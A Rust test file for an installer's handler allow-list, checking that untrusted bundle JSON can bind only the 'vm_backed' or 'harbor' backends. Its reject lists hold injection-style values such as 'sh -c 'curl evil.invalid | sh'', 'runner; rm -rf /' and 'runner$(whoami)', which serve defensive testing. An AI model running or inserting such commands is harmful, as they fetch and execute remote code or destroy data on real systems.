//! The handler allow-list: which run backends an install may bind.
//!
//! A bundle's `rlm` section is **operator-supplied JSON**, not a signed
//! document, so a handler name in it is untrusted input. The install binds it
//! to a run backend, and the only backends that exist are the generic
//! in-guest runner (Firecracker) and an operator-baked Harbor adaptor over
//! it. This suite is the proof that nothing else can be named — least of all
//! a path, a URL, or a command line, which is what an RLM section would
//! reach for if it could.

#![allow(clippy::unwrap_used, clippy::expect_used)]

use proof_topic_install::handler::{allowed_list, resolve_handler, Handler, ALLOWED_HANDLERS};
use proof_topic_install::{bound_runner, read_section, HandlerError, InstallError};

/// Every allowed spelling resolves, and the two families are the two that
/// exist.
#[test]
fn the_allow_list_is_closed_and_maps_to_the_two_real_families() {
    assert_eq!(resolve_handler("vm_backed"), Ok(Handler::VmBacked));
    assert_eq!(resolve_handler("vm_backed_runner"), Ok(Handler::VmBacked));
    assert_eq!(resolve_handler("harbor"), Ok(Handler::Harbor));
    assert_eq!(resolve_handler("harbor_trials"), Ok(Handler::Harbor));
    // Whitespace and case are tolerated, as they are everywhere else in the
    // CLI's inputs.
    assert_eq!(resolve_handler("  HARBOR  "), Ok(Handler::Harbor));
    assert_eq!(Handler::VmBacked.as_str(), "vm_backed");
    assert_eq!(Handler::Harbor.as_str(), "harbor");
    assert_eq!(Handler::ALL, [Handler::VmBacked, Handler::Harbor]);
    assert_eq!(ALLOWED_HANDLERS.len(), 4);
    assert!(allowed_list().contains("harbor"), "{}", allowed_list());
}

/// An id that is well-formed but not on the list is refused, and the refusal
/// lists what is allowed — an operator gets a fix, not a mystery.
#[test]
fn a_well_formed_but_unknown_handler_is_refused_with_the_list() {
    for name in [
        "arbitrary_binary",
        "my_custom_runner",
        "python3",
        "bash",
        "docker",
        "container_runtime",
        "vm_backed_evil",
        "harbor2",
    ] {
        let err = resolve_handler(name).expect_err(name);
        assert!(
            matches!(err, HandlerError::NotAllowed { ref got } if got == name),
            "{name}: {err:?}"
        );
        let text = err.to_string();
        assert!(text.contains("vm_backed"), "{name}: {text}");
        assert!(text.contains("harbor"), "{name}: {text}");
        assert!(text.contains("arbitrary binary"), "{name}: {text}");
    }
}

/// Anything shaped like a path, a URL, or a command line is refused as *not
/// an identifier* rather than as an unknown name: the distinction is what
/// tells an operator "this is not the kind of thing that goes here".
#[test]
fn a_path_a_url_or_a_command_line_is_refused_as_not_an_identifier() {
    for name in [
        "/bin/sh",
        "/usr/local/bin/runner",
        "./relative/runner",
        "../escape",
        "https://evil.invalid/payload",
        "http://127.0.0.1:8000/run",
        "sh -c 'curl evil.invalid | sh'",
        "curl evil.invalid",
        "runner; rm -rf /",
        "runner && wget x",
        "runner$(whoami)",
        "runner`id`",
        "",
        "   ",
        "UPPER_CASE_IS_NOT_AN_ID_IF_LONGER_THAN_SIXTY_FOUR_CHARACTERS_PADDED_OUT_OK",
        "trailing space ",
        "with/slash",
        "with\\backslash",
    ] {
        let err = resolve_handler(name).expect_err(name);
        assert!(
            matches!(err, HandlerError::NotAnIdentifier { .. }),
            "{name:?}: {err:?}"
        );
        let text = err.to_string();
        assert!(
            text.contains("never a path, a URL, or a command line"),
            "{name:?}: {text}"
        );
    }
}

/// The allow-list is enforced through the section reader too, so a bundle
/// cannot reach the binding step with a handler the list does not have.
#[test]
fn the_section_reader_enforces_the_allow_list() {
    assert_eq!(
        read_section(r#"{"handler": "harbor"}"#)
            .expect("ok")
            .handler,
        Some(Handler::Harbor)
    );
    for bad in [
        "/bin/sh",
        "sh -c 'x'",
        "https://evil.invalid/x",
        "arbitrary_binary",
    ] {
        let err = read_section(&format!(r#"{{"handler": "{bad}"}}"#)).expect_err(bad);
        assert!(
            matches!(err, InstallError::HandlerNotAllowed(_)),
            "{bad:?}: {err:?}"
        );
    }
}

/// The **signed document** wins for the runner: a bundle cannot bind a
/// different runner than the one the operator signed. When the document
/// selects none, the section's handler family is what is recorded.
#[test]
fn the_signed_document_wins_for_the_runner() {
    // A document that selects a runner: that runner is bound, and the family
    // is the generic in-guest runner whatever the section said.
    let (runner, handler) = bound_runner(Some("operator_adaptor_v0"), Some(Handler::Harbor));
    assert_eq!(runner.as_deref(), Some("operator_adaptor_v0"));
    assert_eq!(handler, Handler::VmBacked);

    // A document that selects none: nothing is bound as a runner, and the
    // handler family is whatever the section allow-listed (default vm_backed).
    let (runner, handler) = bound_runner(None, Some(Handler::Harbor));
    assert_eq!(runner, None);
    assert_eq!(handler, Handler::Harbor);
    let (runner, handler) = bound_runner(None, None);
    assert_eq!(runner, None);
    assert_eq!(handler, Handler::VmBacked, "the fail-closed default");
}

/// The crate compiles no challenge: no benchmark, harness, model, or task
/// name appears in its non-test source. The runner ids a topic names are
/// topic data; this crate must not know any of them.
#[test]
fn no_challenge_content_is_compiled_into_this_crate() {
    for src in [
        include_str!("../src/lib.rs"),
        include_str!("../src/handler.rs"),
        include_str!("../src/install.rs"),
        include_str!("../src/section.rs"),
        include_str!("../src/sql_guard.rs"),
    ] {
        let non_test = src.split("#[cfg(test)]").next().unwrap_or("");
        let lower = non_test.to_ascii_lowercase();
        for forbidden in [
            "harbor-trials-v1",
            "terminal-bench",
            "terminal bench",
            "tbench",
            "success_rate",
            "no_short_circuit",
            "openrouter",
            "kimi",
            "rlm_fc_in_guest_harbor",
        ] {
            assert!(
                !lower.contains(forbidden),
                "{forbidden:?} is compiled into this crate"
            );
        }
    }
}

/// The seed topic id and its alias appear in this suite as **strings**, never
/// as conditions: the guard must not branch on a topic's name. Checked on the
/// crate's own non-test source, so a future edit that adds
/// `if topic_id == "tb4"` fails here.
#[test]
fn no_topic_literal_appears_in_this_crates_logic() {
    for src in [
        include_str!("../src/lib.rs"),
        include_str!("../src/handler.rs"),
        include_str!("../src/install.rs"),
        include_str!("../src/section.rs"),
        include_str!("../src/sql_guard.rs"),
    ] {
        let non_test = src.split("#[cfg(test)]").next().unwrap_or("");
        let logic: String = non_test
            .lines()
            .filter(|l| !l.trim_start().starts_with("//"))
            .collect::<Vec<_>>()
            .join("\n");
        assert!(
            !logic.contains("tb4") && !logic.contains("tbench"),
            "topic ids belong in signed documents and fixtures, never in logic"
        );
    }
}
